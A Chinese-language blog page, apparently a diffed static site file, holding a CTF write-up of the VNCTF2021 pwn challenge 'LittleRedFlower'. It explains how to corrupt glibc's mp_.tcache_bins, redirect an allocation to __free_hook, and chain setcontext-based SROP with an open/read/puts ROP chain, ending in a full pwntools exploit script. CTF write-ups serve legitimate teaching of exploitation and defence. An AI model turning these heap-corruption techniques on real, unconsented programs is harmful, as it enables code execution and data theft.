@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="学习给自己的">
+    <meta name="description" content="一天一步，总会到的">
+    <meta name="author" content="LOLOLO">
+    
+    <title>
+        
+            LittleRedFlower |
+        
+        桥下少年
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"lololo-pwn.github.io","root":"/","language":"zh-CN"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#339966","avatar":"/images/1.jpg","favicon":"/images/1.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"不要留恋过去,空想未来,专注当下。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                桥下少年
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">LittleRedFlower</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">LOLOLO</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-02-09 13:21:21</span>
+        <span class="mobile">2022-02-09 13:21</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.2k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>5 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="VNCTF2021-PWN-LittleRedFlower"><a href="#VNCTF2021-PWN-LittleRedFlower" class="headerlink" title="VNCTF2021 PWN LittleRedFlower"></a>VNCTF2021 PWN LittleRedFlower</h1><blockquote>
+<p>因为过几天vnctf2022就要来了，所以看看2021的题目希望能在比赛当中做出题目。</p>
+</blockquote>
+<h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p><img src="/2022/02/09/LittleRedFlower/1.png"></p>
+<h2 id="题目整理"><a href="#题目整理" class="headerlink" title="题目整理"></a>题目整理</h2><ol>
+<li><p>libc版本为2.30.so</p>
+</li>
+<li><p>直接泄露了libc，</p>
+</li>
+<li><p>在vul1函数中可以任意地址写一字节</p>
+</li>
+<li><p>输入offest可以任意写8字节</p>
+</li>
+<li><p>申请堆块大小在0xFFF到0x2000之间</p>
+</li>
+<li><p>在申请的堆块上写入数据</p>
+</li>
+<li><p>题目开启了沙盒，禁用了execve，那么只能是利用orw来获取flag了</p>
+</li>
+</ol>
+<h2 id="好像说比赛给了HINT"><a href="#好像说比赛给了HINT" class="headerlink" title="好像说比赛给了HINT"></a>好像说比赛给了HINT</h2><blockquote>
+<p> 打TCACHE_MAX_BINS</p>
+</blockquote>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路()"></a>解题思路()</h2><p>题目提示打TCACHE_MAX_BINS,类别global_max_fast，应该是改写tache的最大size；如果改写成功，那我们就可以通过调试来确定tcache取出堆块时的偏移，然后通过任意写8字节将申请的堆块改写为我们想要的位置， 并且在下一次申请的时候取出修改，通过 setcontext 来达到 SROP。 </p>
+<h2 id="怎么修改TCACHE-MAX-BINS"><a href="#怎么修改TCACHE-MAX-BINS" class="headerlink" title="怎么修改TCACHE_MAX_BINS"></a>怎么修改TCACHE_MAX_BINS</h2><p>通过搜索源代码发现，这是一个宏定义，所以无法直接修改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define TCACHE_MAX_BINS		64</span></span><br></pre></td></tr></table></figure>
+
+<p>继续搜索发现，在源代码中，该宏定义又被赋值给其他变量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#if USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,        </span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-<span class="number">1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> /* No limit.  */</span><br><span class="line"><span class="comment">#endif</span></span><br></pre></td></tr></table></figure>
+
+<p>我们知道在tcache中，如果tcache_bins当中存在堆块，且我们要取出时，则会执行如下流程(可以gdb动调查看)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>而在上述流程中，对idx和TCACHE_MAX_BINS的比较被替换成了tc_idx和mp_.tcache_ bins的比较，如此一来，我们可以更该  mp_.tcache_bins达到目的。</p>
+<p>而后当进入了tcache_get()函数中时，如下</p>
+<p>libc-2.29.so</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">assert</span> (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  <span class="keyword">assert</span> (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;<span class="built_in">next</span>;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = NULL;</span><br><span class="line">  <span class="keyword">return</span> (void *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>libc-2.30.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>libc-2.31.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显，在libc-31.so和libc-2.31版本里已经优化了tcache_get，直接将assert函数去掉了。</p>
+<p> 所以，我们只需要修改 <strong>mp_.tcache_bins</strong> 的值即可，我们可以利用任意写一字节来修改最高位为 0xFF 。</p>
+<h2 id="伪造Tcache的count"><a href="#伪造Tcache的count" class="headerlink" title="伪造Tcache的count"></a>伪造Tcache的count</h2><p>经过修改TCACHE_MAX_BINS为0xff；这样的话tcache_bins的结构体会扩大，不再仅仅是0x290；这样一来我们首先要做的就是确定tcache_bins的idx；这里大概是有两种方法</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ul>
+<li><p>​    直接gdb动调；</p>
+<p>断点源码调式进入到malloc函数</p>
+<p>​    <img src="/2022/02/09/LittleRedFlower/3.png"></p>
+<p>然后调试到下图位置,通过对比发下，这里idx应该就是0x152，即当我们申请的size为0x1530时，对应的tcache_bins的下标为0x152</p>
+<p><img src="/2022/02/09/LittleRedFlower/4.png"></p>
+<p><strong>这边还是建议自己动调</strong></p>
+</li>
+</ul>
+<h3 id="方法二，计算"><a href="#方法二，计算" class="headerlink" title="方法二，计算"></a>方法二，计算</h3><ul>
+<li><p>查看glibc源码发现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);   #这个位置根据申请堆块的大小计算<span class="function">idx</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">MAYBE_INIT_TCACHE</span> <span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>csize2tidx定义如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure>
+
+<p>其中MINSIZE定义如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define MINSIZE  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>而其中MALLOC_ALIGN_MASK定义如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>而MALLOC_ALIGNMENT定义如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line">			  ? __alignof__ (long double) : <span class="number">2</span> * SIZE_SZ)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后大致应该可以计算出idx的位置，但是本人还没试过</p>
+</li>
+</ul>
+<h2 id="最后通过-free-hook来执行SROP"><a href="#最后通过-free-hook来执行SROP" class="headerlink" title="最后通过__free_hook来执行SROP"></a>最后通过__free_hook来执行SROP</h2><blockquote>
+<p>因为libc-2.30.so没有源码不好调试，所以改成了libc-2.31.so</p>
+</blockquote>
+<p>exp(参考wjh师傅修改的)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;GIFT: &#x27;</span>)</span><br><span class="line">stdout_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;stdout_addr: &quot;</span> + <span class="built_in">hex</span>(stdout_addr))</span><br><span class="line">libc.address = stdout_addr - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">r.sendafter(<span class="string">&#x27;You can write a byte anywhere&#x27;</span>, p64(libc.address + <span class="number">0x1eb2d0</span> + <span class="number">0x7</span>))</span><br><span class="line">r.sendafter(<span class="string">&#x27;And what?&#x27;</span>, <span class="string">&#x27;\xFF&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r,&quot;b *$rebase(0xede)&quot;)</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Offset:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x880</span>))</span><br><span class="line">r.sendafter(<span class="string">&#x27;Content:&#x27;</span>, p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">r.sendafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1530</span>))</span><br><span class="line">pop_rdi_addr = libc.address + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi_addr = libc.address + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12_addr = libc.address + <span class="number">0x000000000011c371</span></span><br><span class="line">fake_frame_addr = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x10</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rdi = fake_frame_addr + <span class="number">0xF8</span></span><br><span class="line">frame.rsp = fake_frame_addr + <span class="number">0xF8</span> + <span class="number">0x10</span></span><br><span class="line">frame.rip = libc.address + <span class="number">0x0000000000025679</span>  <span class="comment"># : ret</span></span><br><span class="line">rop_data = [</span><br><span class="line">    libc.sym[<span class="string">&#x27;open&#x27;</span>],</span><br><span class="line">    pop_rdx_r12_addr,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    pop_rsi_addr,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">gadget = libc.address + <span class="number">0x0000000000154930</span> <span class="comment">#0x0000000000154b20: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">frame = <span class="built_in">str</span>(frame).ljust(<span class="number">0xF8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = p64(gadget) + p64(fake_frame_addr) + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + \</span><br><span class="line">          frame[<span class="number">0x28</span>:] + <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span> + p64(<span class="number">0</span>) + flat(rop_data)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>本地打通截图</p>
+<p><img src="/2022/02/09/LittleRedFlower/2.png"></p>
+<p>参考文章</p>
+<p><a class="link" target="_blank" rel="noopener" href="http://blog.wjhwjhn.com/archives/185/">wjh<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#VNCTF-2021-LittleRedFlower-stackoverflow-orw">arttnba3<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：LittleRedFlower</li>
+        <li>本文作者：LOLOLO</li>
+        <li>创建时间：2022-02-09 13:21:21</li>
+        <li>
+            本文链接：https://lololo-pwn.github.io/2022/02/09/LittleRedFlower/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/02/08/%E7%AE%80%E5%8D%95%E6%A0%88%E8%BF%81%E7%A7%BB/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">简单栈迁移</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: '2XOGNqHIX6wo0G39qpF2OD4D-gzGzoHsz',
+                    appKey: 'IiqSl8rLkJTPne7xAwnsukGL',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '放马过来!',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'LOLOLO';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">LOLOLO</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
